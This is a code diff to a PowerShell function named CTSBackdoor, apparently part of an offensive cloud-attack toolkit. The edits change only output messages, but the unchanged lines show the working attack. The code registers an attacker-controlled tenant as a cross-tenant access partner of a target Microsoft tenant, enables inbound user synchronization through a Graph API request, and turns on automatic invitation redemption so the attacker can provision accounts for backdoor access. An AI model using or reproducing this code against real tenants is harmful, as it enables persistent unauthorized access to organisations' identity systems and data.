@@ -15,10 +15,10 @@ function CTSBackdoor {
     Write-Host "`n"
 
     #Enter details for source tenant (attacker controlled tenant)
-    $ExternalTenantId = Read-Host -Prompt "Enter the tenant ID of your tenant (backdoor tenant)"
+    $ExternalTenantId = Read-Host -Prompt "`nEnter the tenant ID of your tenant (backdoor tenant)"
 
     if ($null -eq $ExternalTenantId) {
-        Write-Host "ExternalTenantId cannot be null." -ForegroundColor Red
+        Write-Host "[Input Error] ExternalTenantId cannot be null." -ForegroundColor Red
         Write-Host "Exiting backdoor module now!" -ForegroundColor Gray
         break
     }
@@ -30,10 +30,10 @@ function CTSBackdoor {
 
     try {
         New-MgPolicyCrossTenantAccessPolicyPartner -BodyParameter $Param1 | Format-List
-        Write-Host "1/3 : Added source(backdoor) tenant to target tenant!" -ForegroundColor Gray
+        Write-Host "`n1/3 : Added source(backdoor) tenant to target tenant!" -ForegroundColor Yellow
     }
     catch {
-        Write-Host "Error: 1/3 Failed to add source tenant to target tenant!" -ForegroundColor Red
+        Write-Host "`n[Error] 1/3 Failed to add source tenant to target tenant!" -ForegroundColor Red
         #break
     }
     
@@ -46,10 +46,10 @@ function CTSBackdoor {
 
     try {
         Invoke-MgGraphRequest -Method PUT -Uri "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy/partners/$ExternalTenantId/identitySynchronization" -Body $Param2
-        Write-Host "2/3: Enabled user synchronization in target tenant!" -ForegroundColor Gray
+        Write-Host "`n2/3: Enabled user synchronization in target tenant!" -ForegroundColor Yellow
     }
     catch {
-        Write-Host "Error: 2/3 Failed to enable user synchronization in target tenant!" -ForegroundColor Red
+        Write-Host "`n[Error] 2/3 Failed to enable user synchronization in target tenant!" -ForegroundColor Red
     }
     
     #Verify config deployed successfully to proceed to next step
@@ -59,11 +59,11 @@ function CTSBackdoor {
             "InboundAllowed"="True"
         }
         Update-MgPolicyCrossTenantAccessPolicyPartner -CrossTenantAccessPolicyConfigurationPartnerTenantId $ExternalTenantId -AutomaticUserConsentSettings $AutomaticUserConsentSettings
-        Write-Host "3/3: Setup automatic invitation redemption in target tenant!`n" -ForegroundColor Yellow
-        Write-Host "Successfully deployed backdoor config in target tenant!" -ForegroundColor Yellow -BackgroundColor Gray
-        Write-Host "`nTo get backdoor access deploy cross tenant synchronization in your source tenant and provision users in the target tenant" - -ForegroundColor Gray
+        Write-Host "`n3/3: Setup automatic invitation redemption in target tenant!`n" -ForegroundColor Yellow
+        Write-Host "`n[Success] Deployed backdoor config in target tenant!" -ForegroundColor Yellow
+        Write-Host "`nTo get backdoor access - deploy cross tenant synchronization in your source tenant and provision users in the target tenant" - -ForegroundColor Gray
     }
     else {
-        Write-Host "Error: 3/3 Failed to deploy config!" -ForegroundColor Red
+        Write-Host "`n[Error] 3/3 Failed to deploy config!" -ForegroundColor Red
     }
 }
